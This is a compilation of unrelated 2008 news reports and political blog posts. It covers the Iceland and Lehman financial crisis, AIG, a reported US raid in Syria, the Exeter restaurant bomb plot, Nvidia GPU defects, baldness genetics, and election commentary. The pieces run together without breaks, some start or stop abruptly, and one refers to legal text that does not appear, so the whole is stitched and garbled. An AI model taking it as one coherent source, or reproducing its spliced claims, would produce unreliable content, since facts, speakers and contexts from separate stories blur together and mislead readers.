Until the international media decides to cover the story of Camp 22 , it will remain out of sight and out of mind .
Now you know the story , but you ’ll continue to be one of the few .
Thank you for taking a few minutes to give a thought to the people who live and die in Camp 22 .
Your thoughts and mine will not save them , of course , but it ’s almost too much to imagine that thousands of human beings would die there without anyone mourning them , for in Camp 22 , even mourning the dead is forbidden .

( Recasts with detail , background )
REYKJAVIK , Oct 7 ( Reuters ) - Iceland ’s crown currency surged after news on Tuesday that Russia would give the country 4 billion euros in loans to help it through a financial crisis that threatened to overwhelm the national economy .
The Icelandic crown had dropped 35 percent earlier EURISK=D3 on the news the state was taking over the country 's second - biggest bank .
But it staged a huge recovery to 220 per euro after Iceland 's central bank said in a statement that Russia had agreed to lend the money .
Using emergency powers adopted on Monday , Iceland dismissed the board of directors of Landsbanki LAIS.IC and put the bank in receivership , a minister told state radio on Tuesday .
Commerce and banking minister Bjorgvin Sigurdsson said the bank would be open and run as normal while the changes were taking place .
Iceland ’s Financial Supervisory Authority had put its own people in place of the bank ’s board .
Threatened with national bankruptcy , Iceland adopted sweeping powers over banks late on Monday as its financial system tottered and its currency plunged 30 percent .
The ruling alliance and opposition parties united on a bill that gave the state the ability to dictate banking operations , including provisions that allow it to push through mergers or even force a bank to declare bankruptcy .
Parliament passed the bill and its provisions took effect immediately .
Investment firm Exista kicked off on Tuesday what is expected to be a string of Icelandic asset sales , saying it will sell its near 20 percent stake in Finnish insurer Sampo to reduce liabilities .
But Straumur - Burdaras STRB.IC , another large Icelandic financial firm , said it saw no sign that it needed state intervention .
Kaupthing , the island ’s biggest bank , said Iceland ’s central bank had lent it 500 million euros .
It said it had not been approached by the state ’s financial regulator .
SMALL NATION , BIG PROBLEMS
Iceland has found itself perched on a faultline in the global financial turmoil .
“ We were faced with the real possibility that the national economy would be sucked into the global banking swell and end in national bankruptcy , ” Prime Minister Geir Haarde told the nation late on Monday .
Iceland is an island in the middle of the North Atlantic , home to just 300,000 people .
But its financial significance has swelled in recent years as its banks expanded overseas , investors took large positions in its high - yielding currency and foreign firms poured money into local projects .

Markos has several of them , but this one is the best , from Andrew McCarthy over at the National Review Online :
We have a disaster here — which is what you should expect when you delegate a non-conservative to make the conservative ( nay , the American ) case [… ]
Great .
Memo to McCain Campaign : Someone is either a terrorist sympathizer or he is n’t ; someone is either disqualified as a terrorist sympathizer or he ’s qualified for public office .
You helped portray Obama as a clealy qualified presidential candidate who would fight terrorists .
If that ’s what the public thinks , good luck trying to win this thing .
With due respect , I think tonight was a disaster for our side .
I ’m dumbfounded that no one else seems to think so .
Obama did everything he needed to do , McCain did nothing he needed to do .
What am I missing ?
Click to viewWe asked six political pundits , including Andrew Sullivan and DailyKos ' Markos Moulitsas , to pick one piece of science fiction that you must read or watch before stepping into the voting booth next month .
After all , science fiction often deals with some of the biggest what - ifs and alternate futures imaginable .
So we could n't imagine any better preparation for participating in democracy than six science fiction classics , as chosen by the experts .
The pundit : Markos Moulitsas ( DailyKos )
What they recommended : " Franchise " by Isaac Asimov .
Advertisement
What it 's about :
This 1955 story is part of Asimov's " Multivac " series of stories .
In the futuristic world of 2008 , the United States has become an " electronic democracy . "
Multivac , the super - computer , chooses one lucky person to be " voter of the year . "
This person , Norman Muller , answers a series of questions and the computer uses those to decide what the results of an election would have been , if an election had happened .
Why is this good election - season material ?
Moulitsas tells io9 :
We live in a world that has accepted 1984 's doublespeak as part and parcel of the political process .
But that 's too easy and cliched and answer .
So how about Asimov 's " Franchise " ?
A single voter , chosen by computer , decides the election , and he 's proud that the citizens got to make their voice heard through him , except , of course , that everyone else did n't get to vote .
Consider the modern political campaign , with robo polls which proclaim the electorate 's choice after a few hundred responses , and robo calls and electronic voting machines and all that stuff , and maybe someone can torture out an analogy .
In reality , this election season has been stranger than any fiction imaginable .

The pundit : Andrew Sullivan ( Atlantic Monthly )
What they recommended : Wall - E
What it 's about :
In this Pixar animated movie , the human race has abandoned the garbage - strewn Earth , and our childlike descendants now live on a space liner , laying on floating barcaloungers and having all their needs met by robots .
One garbage - compacting robot remains functional on Earth , and he discovers a single piece of vegetation , proving that the planet can still support life .
G/O Media may get a commission LG 75 - Inch 8K TV Buy for $ 2150 from BuyDig Use the promo code ASL250
Why is this good election - season material ?
Sullivan did n't elaborate , but Wall - E is rife with political allegory .
You can read it as a simple environmentalist fable about the dangers of mass consumption and unsustainable living .
You can see it as a warning against the " nanny state " which would try to take care of all our needs and save us from getting our hands dirty .
You can see it as an admonishment to be curious about the world we live in and how we got here .
The pundit : Jonah Goldberg ( National Review Online )
What they recommended : Angel , season four .
What it 's about :
An extra-dimensional being ( played by Gina Torres ) appears on Earth , and everyone who sees her becomes totally devoted to her and starts to worship her .
She brings peace and prosperity , and only Angel 's friend Fred can see that she 's really a hideous monster .
Advertisement
Why is this good election - season material ?
Goldberg tells io9 :
In the story , the world is mesmerized by a god from another dimension played by a charismatic black woman who truly does bring universal peace and love to the planet .
Her only price : we all must worship her ( and provide her with a statistically irrelevant number of humans to eat ) and unify around our love for her .
I do n't think Obama is evil or a villain of any kind .
But the lesson is pretty valid .
Obama is the high priest of a cult of unity .
Unity can be useful , but it is also very , very dangerous .
That 's why the founders conceived of a system of divided government , after all .

The pundit : Amanda Marcotte ( Pandagon )
What they recommended : Margaret Attwood , The Handmaid 's Tale .
Advertisement
What it 's about : This Arthur C. Clarke Award - winning novel takes place in a future dystopian U.S. governed by religious fundamentalists .
Women are no longer allowed to learn to read .
Because of declining fertility , fertile women ( like the main character Offred ) are turned into " handmaids , " whose only job is to bear children for wealthy couples .
Why is this good election - season material ?
Says Marcotte :
It probably sounds a little trite since it gets referenced so much , but in light of the promotion of a true - believer fundamentalist to a national ticket , I have to recommend Margaret Atwood 's The Handmaid 's Tale .
It 's not just because it's a dystopia that shows what America would be like under a Christian theocracy , but also because the book brilliantly skewers other aspects of the right - wing culture .
You have the female misogynist Serena Joy that finds out the hard way that she is n't exempt from the category ' woman ' just because she was a stalwart soldier for the far right .
You also are reminded that the conservative men who carry on about sexual morality in public all too often have their own closet full of secrets .
The book is a reminder that right wing politics is n't so much about ' values ' , but about power and control .

The pundit : Glenn Reynolds ( Instapundit )
What they recommended : Vernor Vinge , Rainbow 's End .
Advertisement
What it 's about :
It 's 2025 , and enhanced reality is everywhere .
People use contact lenses to interact with computer - generated artifacts , and people use " silent messaging " to communicate ubiquitously .
Poet Robert
Gu rediscovers this world after his Alzheimer 's disease is cured , and gets drawn into a world of conspiracies and bioterrorism .
And because everything in our lives is run by computer systems , including our cars , it 's super vulnerable to hackers — especially artificially intelligent hackers .
Why is this good election - season material ?
Says Reynolds :
It describes a near - future that seems to be getting safer as it is actually growing more dangerous .
I think it is a must - read .
Advertisement
The pundit : Kevin Drum ( Mother Jones )
What they recommended : Frederik Pohl , The Merchants ' War .
Advertisement
What it 's about : Pohl 's 1984 sequel to his 1955 collaboration with C.M. Kornbluth , The Space Merchants .
In the first book , the Earth is basically taken over by advertising agencies , and we follow one exec who is trying to sell people on the idea of emigrating to Venus .
In the sequel , it 's 100 years later , and we follow Tenny , an exec who 's addicted to Mokie - Koke and stuck marketing " intangibles , " meaning religion and political candidates .
But it turns out Tenny 's boss is really a Venusian agent who wants to take over the Earth government and cause an economic depression on Earth , so Earth will leave Venus alone .
Why is this good election - season material ?
Drum tells io9 : " If you do n't think it 's about modern politics , read it again . "
He later elaborated on his own blog , noting that real - life political consultants have been developing " endorphin branding , " the use of scents at political events , to create a positive emotional experience linked to a candidate .
The scent " can be reintroduced at a later time to trigger and recreate the desired response . "
Writes Drum :
A few days ago an editor asked me which science fiction book I 'd suggest people read before the election .
I recommended Fred Pohl 's The Merchant Wars .
It probably seemed an odd choice , but here 's an excerpt : New York , New York !.... I saw a miraculously clear stretch of sidewalk .... I walked past — and WOWP a blast of sound shook my skull and FLOOP a great supernova flare of light burned my eyes , and I went staggering and reeling as tiny , tiny elf voices shouted like needles in my ear Mokie - Koke , Mokie - Koke , MokieMokieMokie - Koke ! .... " I warned ya , " yelled the little old man from a safe distance ....
He was still waving the signpost , so I staggered closer and blearily managed to deciper the legend under the graffiti : Warning !
COMMERCIAL ZONE Enter at Own Risk .... " What 's a ' Mokie - Coke ' ? " I asked ..... There was a vending machine , just like all the other Mokie - Koke machines I 'd been seeing all along , on the Moon , in the spaceport , along the city streets .
" Do n't fool with the singles " he advised anxiously .
" Go for the six - pack , okay ? " .... Poor old guy !
I felt so sorry for him that I split the six - pack as we headed for the address the Agency had given me .
Three shots apiece .
He thanked me with tears in his eyes but , all the same , out of the second six - pack I only gave him one .
.... " Dr. Mosskristal will review your medical problem for you . "
And the tone said bad news ....
" What you have , " she explained , " is a Campbellian reflex .
Named after Dr. H.J. Campbell .
Famous pioneering psychologist in the old days , inventor of limbic - pleasure therapy . " ....
" Let 's just say that you 've had your limbic areas stimulated ; under the influence of that great upwelling of pleasure you 've become conditioned to associate Mokie - Koke with joy , and there 's nothing to be done about it . "
Does n't seem quite so much like science fiction after reading about endorphin branding , does it ?

The troubled insurer nixes plans for a risk - management conference later this month in California under public pressure for costs savings .
For more coverage from TheStreet.com Ratings team , check out TheStreet.com Ratings section .
AIG
( AIG ) - Get Report
, the large U.S. insurance company that took on too much risk before the government stepped to
bail it out
last month , has canceled a risk - management conference scheduled for later this month in California .
The insurer confirmed today it has nixed plans for a confab scheduled for later this month at the luxurious Ritz - Carlton , Half Moon Bay .
AIG , which just today received another $ 37.8 billion from the
Federal Reserve
, recently came under fire for holding a conference at the St. Regis Resort in Monarch Beach , Calif .
AIG hosted that nearly $ 500,000 conference days after the U.S. government stepped in with an $ 85 billion loan in mid-September .
The conference at the Half Moon Bay , already attracting criticism in the media this morning , would have been the fifth one held for the AIG Private Client Group and would have been attended by independent agents and brokers providing services for high net worth individuals .
It would have required the attendance of larger numbers of AIG employees , as it was to serve partially also as a conference to earn credits for continuing education .
Joe Norton , director of public relations at AIG , said that the earlier event held in Monarch Beach resulted in a reevaluation of all of the costs in AIG operations .
In a letter to Treasury Secretary Henry Paulson yesterday , Edward Liddy , the newly appointed Chairman and CEO of AIG , said that the event held by American General Life Insurance Co. -- rated B by TheStreet.com Ratings -- was mischaracterized in a congressional hearing .
Liddy pointed out that this was an event for independent life insurance agents , not AIG executives and that this sort of meeting is normal in the business .
The conference , held for 50 top - producing life insurance agents and their guests was attended by 10 employees of the insurance subsidiary , none of which were corporate executives , according to Liddy 's letter .
Liddy accepted that although the event had been planned for many months , " our company is now facing very difficult challenges -- and that we owe our employees and the American public new standards and approaches . "
Liddy assured Paulson that AIG management is reevaluating the costs of all of AIG operations and is focused on doing what is necessary to address the capital structure , repay the
Federal Reserve
and emerge as a healthy global insurer .

It takes a special eye to see Houston as the setting for a fairy tale .
Wes Anderson thought about shooting his second film , Rushmore , in New England , but he could n't find a location that worked for the titular school .
So he asked his mother , real estate agent Texas Anderson , to shoot his alma mater , St. John 's School , " standing in the circle and rotating while shooting one photo after another , " she said .
The search ended there .
Having found Rushmore Academy right in his backyard , Wes Anderson 's next task was finding Houston locations for the rest of the film .
( By the way , the city is never stated as the setting in the movie . )
He shot most of it at St. John's , but there are also scenes filmed at a home in Boulevard Oaks , Lamar High School , a barbershop in the Heights , North Shore High School , the Forest Club on Memorial and a stadium parking lot just outside the Loop ( see map on Page E3 ) .
When he needed a school that would allow minor pyro for Max Fischer 's ( Jason Schwartzman ) play , Anderson found one in North Shore , according to his father , Mel , who works in public relations .
" I was impressed to see the trucks and equipment of three volunteer fire departments inside , " Mel Anderson said .
" And there was Wes , calmly directing the whole thing . "
While little clues ( police insignias and buses ) give away the fact that Anderson 's cult film was shot here , Rushmore , which turns 10 this week and is being screened tonight at Discovery Green , was designed as a tale without region .
That lack of specificity makes Rushmore a refreshing film to watch multiple times .
It feels apolitical ( especially after the two recent political conventions ) and dreamy .
It 's an entirely lovable movie about sometimes , but not always , lovable characters .
The sweet , sad , charming and irritating ways we regard each other — family , friends , acquaintances and chapel partners — ring true .
Rushmore still lends itself to the practices of cult - movie watching , with its strange quotable bits about how its hero , Max , misses the seasons at his old school , Rushmore , after transferring to one across the street ; or how interesting it is that two people could both have dead people in their lives .
Max — played with cuddly complexity by a very young Schwartzman — is too real a dreamer .
He 's a quintessential jack of all trades , master of none ; a profound underachiever .
He falls in love with things the way he perceives them and crashes hard when they let him down .
He 's as hypocritical as the rest of us , lionizing the progress we like and nostalgic for the way some things were .
Anderson 's mother mentioned that the St. John's of Rushmore is " practically unrecognizable now . "
In a way that underscores the fluid charm that makes Rushmore so satisfying years later : that timelessness and placelessness .
It 's something Anderson might have been referencing in the title .
Max puts the stone - built school on a pedestal .
He romanticizes it and is ruined by it .
Maybe it was n't the right place for him after all .
Or maybe he should have avoided treating it like a monument .
On the subject of monuments , Mount Rushmore is a curious one .
The bright idea of blasting presidential likenesses out of a mountain is a peculiar ode to icons and progress .
Choosing human iconography over heavenly beauty shows a strong commitment to the modern over the natural .
At the same time , having seen it , it 's a strangely and inexplicably breathtaking landmark .
Was carving up a mountain worth it ?
I do n't know .
If Anderson 's title was a reference to the monument , I have n't heard him say so .
He deftly distances himself from that sort of judgment in his work .
His movies indicate he likes to think we can change for the better .
That 's his concern .
Sometimes it takes a near - death experience , other times it 's losing a loved one , sometimes it 's an absurd spiritual journey on a train .
Anderson has , with his five films , gently tweaked old film forms with his identifiable style .
With varying degrees of success , he 's done the heist movie , the fairy tale , the family drama , the adventure and the road movie .
His next movie , The Fantastic Mr. Fox , should come out next year .
It 's a stop- motion animation film based on Roald Dahl 's darkly funny tale ( did he write any other kind ? ) .
Not one to do the same thing twice , Anderson seems to be returning to the fairy tale but with a very different approach on Fox .
There wo n't be the charming Houston landmarks that you might pass from time to time .
But the other stuff we all have in common should be in there .

Joshua Landis at Syria Comment on the US allegedly launching a helicopter attack inside the country from Iraq :
[ Syria ] has refused to restart intelligence sharing with the US , which was broken off following the deterioration of relations in 2005 .
Petraeus sought to go to Damascus in December 2007 to restart intelligence sharing , but was forbidden from doing so by the White House .
Syria has been eager to restart intelligence sharing which would help to reduce cross border violations , but it demands a price - that the US recognize Syria ’s assistance by returning an ambassador to Damascus .
The White House has refused to do this , preferring to use sticks to force Syrian compliance .
One must presume that the most recent killing of Syrians is designed to be just such a stick .
It will , of course , not force compliance , but the Bush administration must assume that an Obama victory on November 4 will force Syria to behave nicely in order to win favor with the new administration .
Thus ,
White House analysts may assume that it can have a  freebe ” taking a bit of personal revenge on Syria without the US paying a price .
Damascus may just have to write it off as a good bye salute from its friends in Washington .
The record industry lost a landmark battle last spring , when a court said that merely printing " not for resale " on an unsolicited promo CD does not prevent you from reselling it — and certainly does not prevent me from buying it .
The judgement establishes that " first sale " — the legal doctrine that says that once you buy something , it 's yours — is still alive and well .
This The Legality article unpacks it all for you :
Once again , the music industry overestimated the level of control they should be allowed to maintain over their copyrighted works .
Just as when Sony invaded its consumers ' privacy by embedding software in CDs and when the five largest music distribution companies illegally corroborated to fix the price of CDs , the music industry has again violated the law .
The United States District Court for the Central District of California concluded , via summary judgment , that the purported EULA included by UMG did not create a " license , " nor does it allow UMG to retain any control over the promotional CD .
UMG gave away these CDs , and those who receive them are free to dispose of them as they see fit .
Therefore , the court found , as the legal owner of the CDs in question , Mr. Augusto and Roast Beast Music broke no laws in selling these recordings , and may continue to do so .
At least we can still sell our old CDs … Right ?
It depends .
While Mr. Augusto enjoys the right to sell his legally owned CDs , questions arise in a number of states as to who can purchase them .
The music industry , it seems , is foregoing lawsuits in favor of promoting preventative legislation .
Recent legislation in Florida , Utah , Wisconsin , and Rhode Island has made it more difficult to sell used CDs in those states than it is to get a driver 's license .
In Florida , for example , anyone attempting to sell used CDs to a retailer must present identification and be fingerprinted , and any retailer looking to sell those same CDs must apply for a permit and submit a $ 10,000 bond with the Department of Agriculture and Human Services .
Thankfully , those restrictions do not apply to online or person - to - person sales .
Foiled by toilet lock : How Muslim convert set off bombs in error because he could n't open door
A British Muslim convert with a mental age of ten was unable to blow up a restaurant because he'd locked himself in a toilet .
Nicky Reilly , 22 , had gone into the cubicle of an Exeter eaterie to assemble the nailbombs from chemicals in bottles .
He then planned to rush among the 50 diners - many of them children - and detonate the devices .
However , he found he could n't unfasten the lock and then one of the bombs exploded , setting the others he was holding off .
Reilly , who was groomed over the internet by extremists into becoming a suicide bomber , was arrested when he staggered outside with serious facial injuries .

Failed attack : Reilly admitted attempted murder after planning to blow up a family restaurant in Exeter
Prosecutor Stuart Baker said : ' He was unable to open the lock of the cubicle door and come out , by which time the first device had already exploded . '
Anti-terror investigators believe Pakistani radicals targeted Reilly because of his history of mental illness .
A plot was hatched involving the Giraffe restaurant in Exeter , where 50 diners , many with their children , were enjoying the half - term break on May 22 this year .
Yesterday , Reilly , who has changed his name to Mohammad Abdul - Aziz Rashid Saeed - Alim , pleaded guilty at the Old Bailey to preparing a terrorist attack and attempted murder .
After the attack police searching his home in Plymouth found a suicide note in which he quoted Osama Bin Laden and evidence that other possible targets had been a police station and a shopping centre .
A large number of extremist websites and a video titled ‘ homemade bombs ’ were found on his computer .
He had gone online to find out how to make bombs and discuss targets with chatroom contacts in Pakistan .
Officers are still trying to trace the extremist cell that successfully targeted him via his YouTube page – on which he called himself Chechen233 .
The case is a chilling echo of terrorist methods in Iraq , where the disabled have been persuaded to blow themselves up .
Reilly ’s bungled attack came as a shock to police , but it emerged that the 6ft 3in , 18 - stone bomber was ‘ known ’ to officers .
Yesterday he was remanded in custody for sentencing on November 21 .
The judge , Mr Justice Calvert - Smith said Reilly had ‘ long nursed an ambition ’ to become a martyr .
Reilly , circled in red , was spotted on CCTV shortly before the attack .
Below , he is arrested by police after the failed bombing which left him with serious facial injuries
He said : ‘ During the early months of 2008 he was in frequent touch with apparently two other people as yet unidentified with whom he discussed his plans and from who he received a certain amount of encouragement and information over the internet using a website called Chechen233 .
' There was some debate , which is revealed by comments on the computer ,
about what sort of person should be targeted in due course , whether public servants such as police officers or other public servants or ordinary citizens .
‘ In the end the decision was made to target ordinary citizens in a restaurant . ’

Over several months , the court heard , he bought enough materials to make two types of bomb .
The judge said : ‘ He appears to have tried to increase the potential for injury and death both to himself and others by putting chemicals in glass bottles and filling those bottles with a total of around 500 nails . ’
With six bottles in a rucksack , three containing caustic soda , three kerosene and another chemical contained in drain cleaner , Reilly took the bus from Plymouth to Exeter and , after a cup of coffee , went into the Giraffe toilets .
‘ As he prepared the caustic soda devices in the toilet of the restaurant they began to
explode , ’ Mr Justice Calvert - Smith said .

‘ He was subsequently , as the world knows , arrested and injured himself . ’
After the case , Assistant Chief Constable Debbie Simpson of Devon and Cornwall Police said : ‘ The incident in Exeter shows that terrorism remains a real and serious threat to all communities across the UK and not just our major cities . ’
Incredibly , Reilly ’s YouTube page was still online yesterday .
It included clips of the September 11 attacks and a video entitled ‘ How to make a benzine bomb ’ .

With Approval of Congress at 9 % , Impeachment Inches Its Way onto the Table
HP Pavilion Slimeline S3200C
( Credit : HP )
It was just a matter of time , but the defective Nvidia mobile GPUs that keep coming to light in a growing number of laptops models have finally made the unfortunate leap to desktops .
Hewlett - Packard ( HP ) is reporting that 38 different models in its Slimline Desktop PC line are potentially affected by possibly defective Nvidia - based GPUs .
HP reports that the affected models " may not boot or may not display video , " and has implemented a " Limited Warranty Service Enhancement " that " provides for a motherboard replacement at no charge for 12 months from the date your one - year Hardware Limited Warranty expires or until December 31 , 2009 , whichever is sooner . "
Owners who have already paid for repairs directly related to this problem are instructed to contact HP for reimbursement .
As the defective graphics chip is integrated into the motherboard , the entire motherboard needs to be replaced .
Nvidia 's Director of Public Relations EMEAI told PC Pro , " It is slimline , notebook - like design but there is no conclusive evidence that the failure mechanism is the same as the notebook issue we announced in July ...
We are working very closely with HP to determine if / how the Nvidia chipset is involved in the failures . "
We 're not sure what is worse : that Nvidia might have , or that the problem that was previously just relegated to laptops is even bigger than Nvidia first admitted .
Which is n't to say that Nvidia did n't already know about the full extent of the problems .
PC
Pro also reported back in August that Nvidia hinted that it was forced to limit the full disclosure of the problems by its partners .
An Nvidia spokesperson told the following to reporters : " The truth is , our obligations to our partners limit what we can say .
We need to leave announcements to our partners like Dell and HP ...
I know there 's frustration , and it would make my job easier if I could give out the facts that I know , but we have obligations to our partners .
We discuss it constantly , and the company would like to be more upfront about this -- but we can't be .
" Which leads us to the conclusion that this drama is far from played out .
We 're betting that more manufacturers of desktops with integrated Nvidia graphics chips will be coming forward in the coming weeks and months with similar announcements of potential problems and product recalls .

Researchers at McGill University , King 's College London and GlaxoSmithKline Inc. have identified two genetic variants in caucasians that together produce an astounding sevenfold increase the risk of male pattern baldness .
Their results will be published Oct. 12 in the journal Nature Genetics .
About a third of all men are affected by male pattern baldness by age 45 .
The condition 's social and economic impact is considerable : expenditures for hair transplantation in the United States alone exceeded $ 115 million ( U.S. ) in 2007 , while global revenues for medical therapy for male - pattern baldness recently surpassed $ 405 million .
Male pattern baldness is the most common form of baldness , where hair is lost in a well - defined pattern beginning above both temples , and results in a distinctive M - shaped hairline .
Estimates suggest more than 80 per cent of cases are hereditary .
This study was conducted by Dr. Vincent Mooser of GlaxoSmithKline , Dr. Brent Richards of McGill University 's Faculty of Medicine and the affiliated Jewish General Hospital ( and formerly of King 's College ) , and Dr. Tim Spector of King 's College .
Along with colleagues in Iceland , Switzerland and the Netherlands , the researchers conducted a genome - wide association study of 1,125 caucasian men who had been assessed for male pattern baldness .
They found two previously unknown genetic variants on chromosome 20 that substantially increased the risk of male pattern baldness .
They then confirmed these findings in an additional 1,650 caucasian men .
" I would presume male pattern baldness is caused by the same genetic variation in non-caucasians , " said Richards , an assistant professor in genetic epidemiology , " but we have n't studied those populations , so we can't say for certain . "
Though the researchers consider their discovery to be a scientific breakthrough , they caution that it does not mean a treatment or cure for male pattern baldness is imminent .
" We 've only identified a cause , " Richards said .
" Treating male pattern baldness will require more research .
But , of course , the first step in finding a way to treat most conditions it is to first identify the cause . "
" Early prediction before hair loss starts may lead to some interesting therapies that are more effective than treating late stage hair loss , " added Spector , of King 's College and director of the TwinsUK cohort study .
Researchers have long been aware of a genetic variant on the X chromosome that was linked to male pattern baldness , Richards said .
" That 's where the idea that baldness is inherited from the mother 's side of the family comes from , " he explained .
" However it 's been long recognized that that there must be several genes causing male pattern baldness .
Until now , no one could identify those other genes .
If you have both the risk variants we discovered on chromosome 20 and the unrelated known variant on the X chromosome , your risk of becoming bald increases sevenfold . "
" What 's startling is that one in seven men have both of those risk variants .
That 's 14 per cent of the total population ! "

Sweet Jesus , this guy makes me hate him more and more ...
Think Progress :
On Fox News today , Sen. Joe Lieberman ( I - CT ) discussed the downturn in Sen.
John McCain 's presidential prospects , saying McCain " is behind now because of the economy . "
Lieberman then said that he hopes the House passes bailout legislation tomorrow because " it will be good for our country . "
" But frankly , it will be good for John McCain too , " added Lieberman , explaining that " it will get people back to comparing the two candidates free of a sense of crisis that may make them want to turn against Republicans . "
I do n't think he talked to the McCain campaign before doing the interview , because at the same time , here 's John McCain on Morning Joe :
Reports are emerging of a US raid on the Syrian village of Hwijeh , about 10 miles inside of the Syrian border .
The reports themselves are coming from Syrian television and witnesses in the area , and it ’s unclear how reliable the reports may be .
Seven people are believed to have been killed by the US helicopters and soldiers .
The attack would be hugely significant , as cross border fighting could raise tensions in the tenuous relationship of the US and the Syrian Ba’ath Party regime .
Syria and the US have been at odds over both the Syrian influence within Lebanon , the assassinations of anti-Syrian Lebanese MP Walid Eido , cabinet minister Pierre Gemayel , and the UN nuclear inspector ’s suspected Syrian informational source within Syria , Brig .
Gen. Mohammed Suleiman .
The US raid into Syria could signal a shift in tactics by the forces in Iraq , no longer merely relying solely on clandestine operations to perform cross border raids .
Witnesses claim that two helicopters , filled with US soldiers raided the village .
This would probably mean the helicopters landed , and the troops then raided the village , not just a helicopter gunship raid .
If this is the case , one would suspect actionable intelligence on significant targets was acquired and needed to be acted upon .
The US military in Iraq had no comment , according to the reports .
Update : Now four US helicopters are reported to have taken part in the raid .
Two gunships , and two that carried the troops that landed , and delivered a full squad to a ground operation .

We were just talking about why Palin did better tonight than she did in her interviews .
I think it ’s actually very simple .
No follow ups .
It ’s not a criticism of Gwen Ifill .
It was n’t the format she was supposed to work with .
But if you look at Palin ’s interview trainwrecks things always got bad on the follow up — when the interviewer ( Gibson or Couric ) pressed her on the nebulous answer for some specifics , which she could n’t provide .
That ’s the difference .
In what has to be one of the most embarrassing turn of events for the McCain campaign thus far , it appears that in purchasing $ 150,000 worth of clothes for Sarah Palin and her family , McCain and his campaign and / or the RNC have violated the 2002 McCain - Feingold Campaign Finance Reform Act .
A link to the entire text of the law and the relevant text are below .
Only a lawyer would know for sure if this constitutes a breach of the law but the spirit of the law was definitely broken by the RNC , Palin and the McCain campaign :

This puts McCain and his campaign squarely in the realm of slapstick comedy .
Does anyone still think he has the managerial and leadership skills to be President ?
His first major decision was choosing Sarah Palin as his running mate , the most unqualified person on a major national ticket in over 100 years , now his campaign violates a campaign finance reform law that he himself wrote .
It 's hard to demonstrate incompetence any better than that .
He makes Inspector Clousseau , Laurel and Hardy and Abbott and Costello seem adroit by comparison .
Will McCain and the RNC now stop whining about the money Obama has been able to raise ?
If they can afford to spend $ 150,000 on Palin 's clothes , they obviously are not hurting for money .
What does this say about the campaign 's attempts to reach out to the ' Joe the Plumbers ' and ' Joe Sixpacks ' and ' Hockey moms ' out there ?
Do those types of people spend $ 150,000 on clothes from Neiman Marcus and Saks Fifth Avenue ?
To think that Ann Coulter , Rush Limbaugh and various other denizens of the Conservative Right went ballistic over a $ 400 haircut for John Edwards .
Edwards ' expenditures are minor league compared to the McCain - Shoppin ' ticket .
You betcha !
McCain is now in the unenviable position of trying to convince the American people that he should be the Chief Law Enforcement official of the land when he does n't even obey the laws that he crafted .
If he were waging an issue based campaign and not hurling false accusations at Obama as fast as he could shovel , one would almost feel sorry for him .
McCain had it right when he suspended his campaign a few weeks ago , but the reasons and duration were wrong .
He should suspend it permanently because he clearly does not have the judgment or skills for the job .

Some thoughts on the international financial crisis
I should like to thank you for inviting me here today .
I will share with you some personal views regarding the ongoing financial crisis and how we can rebuild a better system .
The current crisis could be the starting point for many ideas , and must certainly be subjected to extensive analysis .
Today , I intend to dwell on one particular issue , which is founded on a simple question :
Why was Lehman Brothers allowed to fail ?
I wish to start with this question because the collapse of this investment bank on Monday , 15 September 2008 was one of the factors which turned the period of turmoil in the financial markets that started in summer 2007 into a full - blown crisis .
Following the failure of Lehman Brothers , panic set in that any bank , irrespective of its size , could go bankrupt .
Market participants revised their investment decisions .
The banks themselves started to fear that any of their counterparties could fail and stopped lending money to each other , causing the interbank market , which had already been under stress for months , to dry up .
In the four weeks following the bankruptcy of Lehman Brothers , the European stock exchanges plunged by around 30 % , more than the total fall recorded over the previous 12 months .
The three - month Euribor spread , which measures tensions in the interbank market , more than doubled , exceeding 170 basis points .
The first steps taken by the authorities to calm the markets did not succeed in restoring confidence .
This did not happen until mid-October , when a coordinated action , which took the form of substantial recourse to public funds and concerted action by the central banks , was initiated in Europe and North America .
Looking back at the events of last month , it seems clear that the failure of Lehman Brothers could have and should have been avoided .
This is not just an ex-post assessment , made in the light of what happened afterwards , but also an ex-ante one .
It was obvious that in a crisis of confidence , such as had existed for months , the failure of a bank , even a medium - sized one , would have a contagion effect , triggering a flight from the system .
This was why , in previous months , in both the United States and Europe ( for example , Denmark , Germany and the United Kingdom ) , the authorities had intervened precisely to avoid the collapse of banks that were in difficulty ( Bear Sterns , Northern Rock , IKB and Roskilde ) .
In the light of this assessment , it is legitimate to ask why the failure of Lehman Brothers was not prevented .
Various theories have been put forward in this regard .
The one I find most credible is that there was a political veto , at the highest levels , against the use of public funds to rescue an investment bank .
Indeed , right after the bank ’s failure was announced , the US Secretary of the Treasury himself confirmed that , “ I never once considered that it was appropriate to put taxpayer money on the line in resolving Lehman Brothers ” [ 1 ] .
The timing of the Lehman crisis also played a key role .
Only a few days later the US Treasury had taken on the sizeable debt of Fannie Mae and Freddie Mac , a decision which was criticised in the press .
Straight after this step was taken , it appeared that the US Treasury did not want to be charged with using public money and practising what has been called a kind of “ financial socialism ” .
There is no doubt that the pressure of public opinion played a role .
We could stop here , with a negative assessment of the political decision taken by the US administration , which proved to be wrong .
However , perhaps the problem might be more complex than that .
As subsequent events have shown , in particular when the first rescue package was rejected by the US Congress , opposition to providing the financial sector with public funds came not only from within the government , but also from parliament .
The Members of the US Congress , many of whom face voters at the beginning of November , feared that such a decision would compromise their re-election .
There was opposition to rescuing Lehman Brothers , therefore , not only from within the Administration , but also from Congress and , more broadly , from public opinion .
In other words , the decision was largely the result of a democratic process .
Ultimately , it was the US citizens who did not want to rescue Lehman Brothers .
This analysis is not restricted to the Lehman Brothers case alone .
Even in countries where bankruptcies were successfully avoided through intervention , the decision was fiercely criticised by the respective parliaments and public opinion .
In some cases , it was only possible to take the decision because immediate approval by parliament was not required .
There is no denying that the conditions could have existed for letting some banks in difficulty to fail had the political situation been different , for example , if elections were imminent in Europe , as in the United States .
Fortunately , this was not the case .
Nevertheless , it is necessary to reflect on what might have happened .
The question that needs to be asked is the following : why do democratic decision - making processes lead to the wrong decisions being taken from the point of view of the common good , not only ex-post , but also ex-ante ?
The response given to justify the decision to let Lehman Brothers go bankrupt is that , for citizens in general , and for tax - payers in particular , it is not fair to use public funds to bail out financial institutions which , in the preceding months and years , had accumulated massive profits for their shareholders and executives .
Obviously , for those assigned the task of deciding whether or not to come to a bank ’s rescue it is not an easy task to convince the electorate that the future losses must be nationalised , when the past profits were privatised .
The rational explanation is that , without the rescue operation , the whole economy would have suffered as a result , with direct consequences for citizens and tax - payers .
Given the contagion effect which is generated following the collapse of a bank , nationalising the losses prevents an even greater evil being unleashed .
The financial sector is different from other sectors , precisely owing to the systemic and contagion effects that a crisis would have on all the other sectors .
